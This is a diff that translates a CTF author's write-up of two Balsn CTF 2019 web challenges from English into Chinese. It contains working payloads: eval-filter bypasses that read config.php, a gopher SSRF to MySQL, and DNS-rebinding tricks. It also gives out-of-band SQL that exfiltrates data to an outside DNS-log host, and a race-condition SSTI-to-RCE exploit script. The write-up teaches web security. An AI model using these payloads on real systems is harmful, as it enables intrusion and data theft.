@@ -1,11 +1,10 @@
 # Balsn CTF 2019 
 
-[中文版 Chinese Version](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/README_tw.md)
+這場因為太忙，只隨便出了兩題簡單的 Web 題 (相對於其他人的題目...)
 
 # Warmup
 
 - Difficulty: ★★
-- Type: Web
 - Solved: 5 / 720
 - Tag: PHP, SSRF, MySQL, Windows
 
@@ -24,16 +23,19 @@ Baby PHP challenge again.
 
 ## Solution
 
-This challenge consists of many simple and old PHP/Windows tricks.
+這題是由一堆簡單又老梗的小技巧組成的
 
+有點意外大部分人都不知道這些老梗
+
+原本預期，一般有在定期打CTF的Web手，解題時間應該要在30分鐘~1小時內...
 
 ### Step 1
 
-In this challenge, you should refactor the code first. 
 
-(Because the source code is so ugly and hard to read :p)
+由於這題原始碼混淆過，難以閱讀
 
-After refactoring, you will get the clean code like this:
+所以第一步必須先整理一下原始碼，變成人可以看的樣子
+
 
 ```php
 <?php
@@ -105,12 +107,12 @@ After refactoring, you will get the clean code like this:
 
 ### Step 2
 
-Let's try to read the `config.php`
+接著，很明顯，`config.php`是一個很誘人的目標
 
-There are two methods:
+有兩種方法可以讀出來:
 
-1. use the `file_get_contents()` (Intended)
-2. use the `eval()` (Unintended)
+1. 使用 `file_get_contents()` (預期)
+2. 使用 `eval()` (非預期)
 
 <br>
 
@@ -118,33 +120,33 @@ There are two methods:
 
 `if(@stRLEn($op) < 4 && @($op + 78) < 'A__A')`
 
-For this if condition, we can simply use `op=-99` to pass it.
+在這個if條件下，你可以簡單使用`op=-99`來繞過
 
-After that, we can input our filename for `file_get_contents()` here:
+接著，會有一個看起來像是空字串的`$_GET`輸入:
 
 `$_ = @$_GET['⁣'];`
 
-The argument of the `$_GET` is `\xE2\x81\xA3`, it is an invisible character.
+但其實這個`$_GET`的參數是`\xE2\x81\xA3`，是一個不可見字元
 
 <br>
 
-Our target is to read `config.php`, but there is some check for our filename:
+我們的目標是去讀`config.php`，但是後面還有一些針對檔名的檢查要通過
 
-We can't use the `.php`, `php.` filename suffix and we can't use `"`, `>`, `<`, `amp`, `$`, `..` in the filename.
+例如，我們不能使用`.php`, `php.`等後綴當作檔名，也不能使用`"`, `>`, `<`, `amp`, `$`, `..`等字串
 
-To bypass this restriction to read the php source code, you just need to append a space character after the filename:
+要繞過這些檢查，我們只需要簡單加上一個空白(0x20)在檔名結尾就行
 
 `config.php[SPACE]`
 
-(Because the server is running on Windows, so there are some weird path normalization rule here :p)
+因為這題Server是Windows系統，所以路徑處理會有一些神奇的特性
 
 <br>
 
-So if you try to read the source code of `config.php` like this:
+但如果你試著用這招去讀`config.php`的原始碼，例如:
 
 `http://warmup.balsnctf.com/?op=-99&%E2%81%A3=config.php%20`
 
-You will get the partial content of `config.php`:
+你會發現，你只能讀出部分的原始碼:
 
 ```php
 <?php
@@ -154,15 +156,15 @@ You will get the partial content of `config.php`:
     $host = "loca
 ```
 
-Because the third argument of `file_get_contents()` is 155. (Read 155 Bytes only)
+因為`file_get_contents()`第三個參數是155，代表只讀155個Bytes
 
 <br>
 
-We should use some special php wrapper to compress the content of `config.php`.
+必須透過一些特殊的php wrapper，來增加我們能讀到的長度
 
-And `php://filter/zlib.deflate` is your best friend!
+對於壓縮長度來說，很容易能想到`php://filter/zlib.deflate`這個filter
 
-use `zlib.deflate` to compress the content and then decompress it by using `zlib.inflate`.
+使用 `zlib.deflate` 來壓縮內容，之後再用 `zlib.inflate` 解壓縮
 
 Script:
 
@@ -174,8 +176,8 @@ file_put_contents("/tmp/tmp", substr($a, $idx));
 
 echo (file_get_contents("php://filter/zlib.inflate/resource=/tmp/tmp"));
 ```
-
-Now you have the `config.php`: 
+    
+讀出來的`config.php`:
 
 ```php
 <?php
@@ -194,72 +196,74 @@ Now you have the `config.php`:
 
 **Method 0x2**
 
-Many teams use the `eval()` of the first branch to read `config.php`. 
+賽中發現有許多隊伍使用 `eval()` 這條路來讀 `config.php`
 
-In this `eval()` branch, your input `$_` will put into `eval("return $_;")`.
+在`eval()`這條 if 分枝中，你的輸入 `$_` 會被放進 `eval("return $_;")`
 
-Here is a strict regex rule to check our input.
+但在這之前，還有一些嚴格的檢查:
 
 ```php
 if( preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',$_) || @strlen(count_chars(strtolower($_), 0x3)) > 0xd || @strlen($_) > 19 )
     exit($secret);
 ```
 
-But we can use `~` operator to bypass many restrictions.
+不過我們可以使用 `~` NOT運算來繞過這些限制
 
-Example: `~urldecode("%8D%9A%9E%9B%99%96%93%9A")` is equal to `readfile`.
+例如: `~urldecode("%8D%9A%9E%9B%99%96%93%9A")` 就等同 `readfile`.
 
 <br>
 
-In Windows, there are some **MAGIC** wildcard features for path normalization.
+在 Windows 中，對於路徑正規上，有許多神奇的萬用字元
 
-Example: 
+例如: 
 
-`>` will match one arbitrary character. (like `?` on Linux) 
+`>` 會匹配一個任意字元 (就像 Linux 上的 `?`) 
 
-`<` will match zero or more arbitrary characters. (like `*` on Linux)
+`<` 會匹配零個或多個任意字元 (就像 Linux 上的 `*`)
 
-(more detail: [My-CTF-CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E8%B7%AF%E5%BE%91%E6%AD%A3%E8%A6%8F%E5%8C%96))
+(更多整理: [My-CTF-CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E8%B7%AF%E5%BE%91%E6%AD%A3%E8%A6%8F%E5%8C%96))
 
-Finally, we can combine `~` trick and `<` trick to read the `config.php`:
+最後, 結合 `~` 和 `<` 就能完整讀出 `config.php`:
 
 `/?op=-9&Σ>―(%23°ω°%23)♡→=(~%8D%9A%9E%9B%99%96%93%9A)(~%9C%90%C3%C3)`
 
-(It is same as `readfile("co<<")`)
+(以上的效果等同 `readfile("co<<")`)
 
 <br>
 
 ### Step 3
 
-The content of `config.php` tells us that the flag is in the MySQL database.
+從 `config.php` 的內容，可以知道 flag 在 MySQL Database中
 
-So our next target is to query MySQL Server and get the result.
+所以我們下個目標，就是去請求後端 MySQL Server，並且讀出請求結果
 
-And we know the user is `admin` with empty password, so we can use `gopher://` protocol to  SSRF to query the MySQL Server.
+由於我們已經知道使用者 `admin` 是空密碼，所以可以透過 `gopher://` 協議去做SSRF，對 MySQL Server 發送請求
 
 <br>
 
-But the gopher payload is toooooo long, we should find a way to bypass the strict regex rule first.
+但 gopher payload 太長了，還需要找一個方法能夠通過嚴格正規表達式和長度等限制
 
-If you try to search all PHP functions that satisfy the regex rule and length limit, you will find a useful function: `getenv()`.
+如果你試著把這些嚴格正規表達式限制和長度限制等規則，套在所以 PHP Function 上面的話
 
-This function will return the specifying header value.
+你會發現，能用的 Function 其實沒幾個，其中一個就是 `getenv()`
 
-Hence, we can put our gopher payload into the HTTP header.
+這個 function 會回傳你指定的 HTTP Header 的值
+
+所以可以把 Gopher Payload 放在 HTTP Header 之中，來繞過這些限制
 
 `(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB)` (length: 18)
 
-It is equal to `getenv("HTTP_T")`.
+這等同 `getenv("HTTP_T")`.
 
 <br>
 
 ### Step 4
 
-Now, you have a blind SSRF!
+現在，你已經有了一個 Blind SSRF!
 
-For the MySQL protocol, you can use some tools like [Gopherus](https://github.com/tarunkant/Gopherus) to create the gopher payload.
+對於構造 MySQL Protocol，可以使用一些現成工具，像 [Gopherus](https://github.com/tarunkant/Gopherus)
 
-At last, you just need to use Time-based or Out-of-band (DNS log) methods to exfiltration the query result.
+最後，你只需要把結果撈出就行，這裡可以使用 Time-based 或是 Out-of-band (DNS log) 等方法就能撈出結果
 
 - `select load_file(concat("\\\\",table_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.tables where table_schema="ThisIsTheDbName";`
     - Output: `fl4ggg`
@@ -269,18 +273,14 @@ At last, you just need to use Time-based or Out-of-band (DNS log) methods to exf
     - Output: `42616C736E7B337A5F77316E643077735F7068705F6368346C7D`
     - hex to ascii: `Balsn{3z_w1nd0ws_php_ch4l}`
 
-
-## Writeups
-
-- [movrment's writeup](https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html)
-
 ---
+
+<br>
 
 # 卍乂Oo韓國魚oO乂卍 (Koreanfish)
 
 
 - Difficulty: ★
-- Type: Web
 - Solved: 15 / 720
 - Tag: PHP, DNS Rebinding, Flask, Race condition, SSTI, RCE
 
@@ -298,15 +298,17 @@ Taiwanese people love korean fish.
 
 ## Solution
 
-This is a white-box challenge, and all the source code are very short and simple :D
+這題直接給你 Source code，並且長度都很短
+
+原本預期難度比 Warmup 高，只是忘記擋 302 Redirect，所以這題瞬間變水題 orz
 
 <br>
 
 ### Step 1
 
-If you look at the source code of `index.php`, you will know the first target is to bypass IP limit.
+第一步，很明顯要繞過 IP 限制，他只給我們訪問 `54.87.54.87`
 
-Actually, here is a obvious DNS Rebinding vulnerability that can bypass IP limit:
+事實上，這邊有很明顯的 DNS Rebinding 可以利用
 
 ```
 $ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
@@ -316,87 +318,89 @@ if($ip === $dev_ip) {
     $content = file_get_contents($dst);
 ```
 
-The `file_get_contents()` will query DNS again.
+`file_get_contents()` 會再去查詢DNS.
 
-So if we set our domain's A record to `54.87.54.87` and `127.0.0.1`, it has some possibilities to bypass IP restriction to query internal services.
+所以只要我們把 Domain 的 A record 設成 `54.87.54.87` 和 `127.0.0.1`
 
-If you don't have any domain ... 
+就有機會通過 IP 檢查，並同時請求 `127.0.0.1` 的服務
 
-Don't worry! 
+沒有 Domain 的小夥伴也別難過
 
-You can use some online DNS Rebinding services like `rbndr.us`.
+你可以使用一些線上 DNS Rebinding 工具，像是 `rbndr.us`.
 
-e.g. `36573657.7f000001.rbndr.us` will return `54.87.54.87` or `127.0.0.1`.
+e.g. `36573657.7f000001.rbndr.us` 會對應到 `54.87.54.87` 或 `127.0.0.1`.
 
 <br>
 
 ### Step 2
 
-From the dockerfile, we know there is a simple flask app running on the same server.
+從 Dockerfile 中，可以看到，後端跑了一個簡單的 flask app
 
-And there is a SSTI vulnerability on `/error_page` function, it uses `render_template_string()` with controllable content.
-
-<br>
-
-If the `error_status` set to absolute path, then the return path of `os.path.join()` will be overwrited.
-
-e.g. `os.path.join("/var/www/flask", "error", "/etc/passwd")` will return `/etc/passwd`
+並且在 `/error_page` 有著很明顯的 SSTI 漏洞，其 `render_template_string()` 參數是可控的內容
 
 <br>
 
-But the problem here is that you can't directly touch this `/error_page`.
+如果 `error_status` 設成絕對路徑，`os.path.join()` 的回傳結果，就會忽略前面已有的內容，被整個覆蓋掉
 
-Because the front-end php will check the query path, the path has to contain the string of `korea`:
+e.g. `os.path.join("/var/www/flask", "error", "/etc/passwd")` 會回傳 `/etc/passwd`
+
+<br>
+
+但這邊最大的難題是，你沒辦法直接請求 flask 的 `/error_page`
+
+因為前端 php 會去檢查你的請求路徑，是否包含 `korea` 字串:
 
 `if(stripos($res['path'], "korea") === FALSE) die("Error");`
 
 <br>
 
-There are two ways that can bypass this restriction:
+這裡有兩種方法可以繞過這個限制
 
 <br>
 
 **Method 0x1**
 
-You can use redirect!
+使用 302 Redirect 繞過!
 
-Using DNS Rebinding to your Server IP, Then set the path `/korea` to redirect to `127.0.0.1:5000/error_page?err=....`.
+只需透過 DNS Rebinding，讓其訪問你自己 Server 的 IP
 
-Because the `file_get_contents()` will follow the 302 redirect.
+接著把 `/korea` 路徑，重導向到 `127.0.0.1:5000/error_page?err=...`
+
+(因為 `file_get_contents()` 是會 follow 302 重導向的)
 
 <br>
 
 **Method 0x2**
 
-Using Flask's special feature!
+使用 Flask 的神奇特性繞過!
 
-In the flask app, `//korea/ping` is equal to `/ping`.
+在 Flask app 中，`//korea/ping` 等同 `/ping`.
 
-Therefore, you can just use `//korea/error_page?err=....` to bypass the restriction.
+因此，使用 `//korea/error_page?err=....` 就能繞過限制
 
 <br>
 
 ### Step 3
 
-Now, we can control the path of the content that `render_template_string()` read.
+現在，我們能控制 `render_template_string()` 的內容，也相當於一個任意讀檔漏洞
 
-But we should find a file that can be placed our controllable payload.
+但要做到 RCE，必須找一個能夠塞我們可控 Payload 的檔案
 
-Because the server is running with PHP, so you can use the `session.upload_progress` trick to upload your SSTI payload to the session file.
+因為 Server 同時跑著 PHP，所以可以使用 `session.upload_progress` trick 來上傳 SSTI payload 到 session file 中
 
-If you provide the `PHP_SESSION_UPLOAD_PROGRESS` in the multipart POST data, PHP will enable the session for you.
+如果在 multipart POST data 中使用 `PHP_SESSION_UPLOAD_PROGRESS`，PHP 會直接啟用 Session (即便你沒有 `session_start()`)
 
-(The concept is same as HITCON CTF 2018 - one line php challenge: [Link](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html).)
+(這裡的知識點，同 HITCON CTF 2018 - one line php challenge: [Link](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html).)
 
-(Note: your payload couldn't contain `|`, because that will break the session content format.)
+(Note: 你的 payload 不能包含 `|`，因為這會破壞 PHP Session 的內容格式)
 
 <br>
 
 ### Step 4
 
-The default `session.upload_progress.cleanup` setting is `On`, so your SSTI payload will be cleaned quickly.
+預設 `session.upload_progress.cleanup` 是 `On`，所以上傳的 SSTI payload 會在短時間被清空
 
-OK! Let's Race it!
+OK! 讓我們去 Race condition 吧!
 
 Exploit script:
 
@@ -457,6 +461,5 @@ pool = ThreadPool(32)
 result = pool.map_async( runner, range(32) ).get(0xffff)
 ```
 
-For the detail of bypassing the SSTI sanitizing, you can read my cheatsheet: [Link](https://github.com/w181496/Web-CTF-Cheatsheet#flaskjinja2) 
+對於繞過 SSTI 限制的細節，可以參考我的CheatSheet: [Link](https://github.com/w181496/Web-CTF-Cheatsheet#flaskjinja2) 
 
-## Writeups
